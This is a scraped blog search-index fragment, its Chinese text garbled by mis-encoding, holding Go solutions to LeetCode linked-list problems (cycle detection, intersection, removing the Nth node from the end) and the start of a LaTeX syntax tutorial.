&lt;p&gt;å¿«æŒ‡é’ˆèµ°è¿‡çš„è·ç¦»ä¸º&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x+y+n(z+y)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.7777700000000001em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;è€Œå¿«æŒ‡é’ˆèµ°è¿‡çš„èŠ‚ç‚¹æ˜¯æ…¢æŒ‡é’ˆçš„äºŒå€ï¼Œå³ï¼š&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;2(x+y)=x+y+n(z+y)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.66666em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.7777700000000001em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;æœ€ç»ˆè¦æ±‚çš„æ˜¯&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x=(n-1)(y+z)+z&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ã€‚&lt;/p&gt;
&lt;p&gt;å½“&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;n=1&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;æ—¶ï¼Œ&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;x=z&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.43056em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œå³å½“ä¸¤æŒ‡é’ˆç›¸é‡æ—¶ï¼Œä»ç›¸é‡èŠ‚ç‚¹å’Œå¤´èŠ‚ç‚¹å„å‡ºå‘ä¸€ä¸ªæŒ‡é’ˆï¼Œå½“ä¸¤æŒ‡é’ˆç›¸é‡æ—¶è®°ä¸ºå¤´å£èŠ‚ç‚¹ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640684345828.gif&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func detectCycle(head *ListNode) *ListNode {
    if head == nil {
        return nil
    }
    var fast, slow *ListNode
    fast, slow = head, head

    for true {
        if fast.Next != nil &amp;amp;&amp;amp; fast.Next.Next != nil {
            fast = fast.Next.Next
        } else {
            return nil
        }
        slow = slow.Next
        if fast == slow {
            index1, index2 := head, fast
            for index1 != index2 {
                index1 = index1.Next
                index2 = index2.Next
            }
            return index1
        }
    }
    return nil

}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;é“¾è¡¨ç›¸äº¤&#34;&gt;é“¾è¡¨ç›¸äº¤â€»&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/intersection-of-two-linked-lists-lcci/&lt;/p&gt;
&lt;p&gt;æ€è·¯å°±æ˜¯å…ˆæ±‚å‡ºä¸¤ä¸ªé“¾è¡¨çš„é•¿åº¦ï¼Œæ±‚å‡ºä¸¤é“¾è¡¨çš„å·®å€¼ï¼Œç„¶åå…ˆè®©é•¿çš„é“¾è¡¨ç§»åŠ¨å·®å€¼æ­¥ï¼Œç„¶åäºŒè€…ä¸€å—ç§»åŠ¨çœ‹æŒ‡é’ˆæ˜¯å¦ç›¸åŒã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func getIntersectionNode(headA, headB *ListNode) *ListNode {
    
    i, j := 0, 0

    tmp := headA
    for tmp != nil {
        tmp = tmp.Next
        i ++
    }

    tmp = headB
    for tmp != nil {
        tmp = tmp.Next
        j ++
    }

    var tmp1, tmp2 *ListNode
    var k int

    if i &amp;gt; j {
        tmp1 = headA
        tmp2 = headB
        k = i - j
    } else {
        tmp1 = headB
        tmp2 = headA
        k = j - i
    }

    for k &amp;gt; 0 {
        k-- 
        tmp1 = tmp1.Next
    }

    for tmp1 != tmp2 {
        tmp1 = tmp1.Next
        tmp2 = tmp2.Next
    }

    return tmp1

}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;åˆ é™¤é“¾è¡¨çš„å€’æ•°ç¬¬nä¸ªèŠ‚ç‚¹&#34;&gt;åˆ é™¤é“¾è¡¨çš„å€’æ•°ç¬¬Nä¸ªèŠ‚ç‚¹â€»&lt;/h3&gt;
&lt;p&gt;https://leetcode-cn.com/problems/remove-nth-node-from-end-of-list/&lt;/p&gt;
&lt;p&gt;åŒæŒ‡é’ˆé¦–å…ˆéƒ½æŒ‡å‘å¤´èŠ‚ç‚¹ï¼Œå¿«æŒ‡é’ˆå…ˆèµ°næ­¥ï¼Œç„¶åå¿«æ…¢æŒ‡é’ˆå†ä¸€èµ·èµ°ï¼Œç›´åˆ°å¿«æŒ‡é’ˆåˆ°ç»“å°¾ï¼Œé‚£ä¹ˆæ…¢æŒ‡é’ˆä¸‹ä¸€ä¸ªå…ƒç´ å³æ—¶è¦åˆ é™¤çš„å…ƒç´ ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;/**
 * Definition for singly-linked list.
 * type ListNode struct {
 *     Val int
 *     Next *ListNode
 * }
 */
func removeNthFromEnd(head *ListNode, n int) *ListNode {
    nilhead := &amp;amp;ListNode{
        0,
        head,
    }

    fast, slow := nilhead, nilhead
    for i := 0; i &amp;lt;= n; i++ {
        fast = fast.Next
    }

    for fast != nil {
        fast = fast.Next
        slow = slow.Next
    }

    slow.Next = slow.Next.Next

    return nilhead.Next
}
&lt;/code&gt;&lt;/pre&gt;
">ã€æ•°æ®ç»“æ„ã€‘é“¾è¡¨</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/latex/"" data-c="
          &lt;p&gt;Texæ˜¯ä¸€ç§è¯­è¨€ä¹Ÿæ˜¯ä¸€ä¸ªæ’ç‰ˆå¼•æ“ï¼Œä½†Texçš„å…ƒå‘½ä»¤å¾ˆéš¾ä½¿ç”¨ï¼Œåæ¥æœ‰äº†è¡ç”Ÿç‰ˆPlain Texã€Latexã€‚&lt;/p&gt;
&lt;h3 id=&#34;latexç¯å¢ƒ&#34;&gt;Latexç¯å¢ƒ&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;åœ¨çº¿Latexç¼–è¾‘ç¼–è¯‘å™¨&lt;/p&gt;
&lt;p&gt;https://www.sharelatex.com/&lt;/p&gt;
&lt;p&gt;https://www.overleaf.com/&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æœ¬åœ°å®‰è£…&lt;/p&gt;
&lt;p&gt;éœ€è¦ä¸¤ä¸ªè½¯ä»¶ï¼Œä¸€ä¸ªæ˜¯latexç¼–è¯‘å™¨ï¼Œä¸€ä¸ªæ˜¯IDEã€‚&lt;/p&gt;
&lt;p&gt;ç¼–è¯‘å™¨ï¼šåœ¨è¿™é‡Œä½¿ç”¨Tex Liveï¼Œå®ƒæ˜¯ä¸€ä¸ªTexçš„å‘è¡Œç‰ˆï¼ŒåŒ…æ‹¬äº†ç¼–è¯‘å™¨ï¼Œå®åŒ…ã€å­—ä½“ç­‰ç­‰ã€‚ä¸‹è½½åœ°å€ï¼š&lt;a href=&#34;https://tug.org/texlive/&#34;&gt;Tex Live&lt;/a&gt; &lt;a href=&#34;https://mirrors.tuna.tsinghua.edu.cn/CTAN/systems/texlive/Images/&#34;&gt;Tex Liveæ¸…åé•œåƒ&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;IDEï¼šå¯é€‰é¡¹å¾ˆå¤šï¼Œå¯ä»¥å‚è€ƒï¼šhttps://www.zhihu.com/question/19954023&lt;/p&gt;
&lt;p&gt;å€Ÿä¸€å¼ å›¾&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640683923593.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;è¯­æ³•&#34;&gt;è¯­æ³•&lt;/h3&gt;
&lt;p&gt;Latexæ˜¯åœ¨ä¸€ä¸ª.texçš„æºæ–‡ä»¶ä¸­ç¼–å†™ã€‚è¯­æ³•ä¸»è¦åˆ†ä¸ºä¸‰ç§ï¼šå‘½ä»¤ã€æ•°æ®ã€æ³¨é‡Šã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;å‘½ä»¤&lt;/p&gt;
&lt;p&gt;åˆ†ä¸ºæ™®é€šå‘½ä»¤å’Œç¯å¢ƒï¼ŒäºŒè€…å¯ä»¥ç›¸äº’åµŒå¥—ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;æ™®é€šå‘½ä»¤&lt;/p&gt;
&lt;p&gt;ä»¥&lt;code&gt;\&lt;/code&gt;èµ·å§‹ï¼Œå¤§å¤šåªæœ‰ä¸€è¡Œ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç¯å¢ƒ&lt;/p&gt;
&lt;p&gt;åŒ…å«ä¸€å¯¹èµ·å§‹å£°æ˜å’Œç»“å°¾å£°æ˜ï¼Œç”¨äºå¤šè¡Œå†…å®¹çš„åœºåˆã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ•°æ®&lt;/p&gt;
&lt;p&gt;æ•°æ®å°±æ˜¯æ™®é€šæ–‡æœ¬å†…å®¹ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ³¨é‡Š&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;latexç»“æ„&#34;&gt;Latexç»“æ„&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;ç‰©ç†ç»“æ„&lt;/p&gt;
&lt;p&gt;æŒ‡æºæ–‡ä»¶çš„ç»„ç»‡å½¢å¼ï¼ŒåŒ…å«åºè¨€ï¼ˆpreambelï¼‰å’Œæ­£æ–‡ä¸¤éƒ¨åˆ†ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;é€»è¾‘ç»“æ„&lt;/p&gt;
&lt;p&gt;æŒ‡æœ€ç»ˆè¾“å‡ºæ–‡æ¡£çš„ç»“æ„ï¼ŒåŒ…æ‹¬æ ‡é¢˜ã€ç›®å½•ã€ç« èŠ‚ç­‰ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;ç‰©ç†ç»“æ„&#34;&gt;ç‰©ç†ç»“æ„&lt;/h4&gt;
&lt;p&gt;åºè¨€ç”¨æ¥å®Œæˆä¸€äº›è®¾ç½®ï¼Œæ¯”å¦‚æŒ‡å®šæ–‡æ¡£ç±»å‹ï¼Œå¼•å…¥å®åŒ…ï¼Œå®šä¹‰å‘½ä»¤ã€ç¯å¢ƒç­‰ã€‚æ–‡æ¡£çš„å†…å®¹åˆ™æ”¾åœ¨æ­£æ–‡ã€‚&lt;/p&gt;
&lt;p&gt;ç¤ºä¾‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\documentclass[options]{class} % æ–‡æ¡£ç±»å£°æ˜
\usepackage[options]{package} % å¼•å…¥å®åŒ…
...
\begin{document} % æ­£æ–‡
...
\end{document}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¸¸ç”¨çš„æ–‡æ¡£ç±»æœ‰ï¼šarticleã€reportã€bookï¼ŒoptionsåŸºæœ¬å¸¸ç”¨ï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1640683986022.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;Latexå†…æ ¸å°ï¼Œå¾ˆå¤šåŠŸèƒ½é€šè¿‡å®åŒ…æ¥å®ç°ã€‚&lt;/p&gt;
&lt;h4 id=&#34;é€»è¾‘ç»“æ„&#34;&gt;é€»è¾‘ç»“æ„&lt;/h4&gt;
&lt;p&gt;ä¸€ä»½æ–‡æ¡£çš„å¼€å¤´é€šå¸¸æœ‰æ ‡é¢˜ã€ä½œè€…ã€æ‘˜è¦ç­‰ä¿¡æ¯ï¼Œä¹‹åæ˜¯ç« èŠ‚ç­‰å±‚æ¬¡ç»“æ„ï¼Œå†…å®¹åˆ™æ•£å¸ƒäºå±‚æ¬¡ç»“æ„ä¹‹é—´ã€‚&lt;/p&gt;
&lt;p&gt;æ ‡é¢˜ã€ä½œè€…ã€æ—¥æœŸç­‰å‘½ä»¤è¦æ”¾åœ¨&lt;code&gt;\maketitle&lt;/code&gt;å‘½ä»¤ä¹‹å‰ã€‚&lt;/p&gt;
&lt;p&gt;ç¤ºä¾‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\title{LaTex Notes}
\author{}
\date{\today}
\maketitle
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;articleå’Œreportå¯ä»¥æœ‰æ‘˜è¦ï¼Œbookæ²¡æœ‰ï¼Œæ‘˜è¦ç¯å¢ƒç”¨æ³•ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\begin{abstract}
...
\end{abstract}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Latexæä¾›äº†ä¸ƒç§å±‚æ¬¡ç»“æ„ï¼Œæ¯ä¸ªé«˜çº§å±‚æ¬¡ç»“æ„å¯ä»¥åŒ…å«è‹¥å¹²ä½çº§å±‚æ¬¡ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\part{...} 		% level -1
\charpter{...} 	% level 0 articleä¸æ”¯æŒ
\section{...} 	% level 1
\subsection{...}% level 2
\subsubsection{...} %level 3
\paragraph{...} % level 4
\subparagraph{...} % level 5
% å¦‚æœä¸æƒ³æ·»åŠ å±‚æ¬¡çš„æ ‡é¢˜ï¼Œå¯ä»¥ä½¿ç”¨*
\section*{...}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ç”¨&lt;code&gt;\tableofcontents&lt;/code&gt;å‘½ä»¤æ¥ç”Ÿæˆç›®å½•ï¼Œæ·±åº¦å¯è‡ªå·±åˆ¶å®šï¼Œä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\setcounter{tocdepth}{2} % æŒ‡å®šæ·±åº¦
\tableofcontents % åˆ—å‡ºç›®å½•
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ç”Ÿæˆæ’å›¾ã€è¡¨æ ¼ç›®å½•ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-latex&#34;&gt;\listoffigures
\listoftables
&lt;/code&gt;&lt;/pre&gt;
